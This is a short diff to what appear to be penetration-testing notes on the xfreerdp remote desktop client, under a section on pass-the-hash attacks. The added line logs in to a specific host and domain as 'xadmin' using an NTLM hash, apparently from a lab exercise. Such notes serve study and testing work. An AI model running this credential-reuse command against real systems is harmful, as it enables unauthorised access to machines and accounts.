@@ -34,7 +34,7 @@ xfreerdp [/d:domain] /u:<username> /p:<password> /v:$ip
 xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:$ip /cert:ignore 
 # /pth:<hash>   Pass the hash
 
-
+xfreerdp  /v:172.16.1.20 /d:DANTE.LOCAL /u:xadmin /pth:649f65073a6672a9898cb4eb61f9684a
 ```
 
 ### Troubleshoot in PtH attack
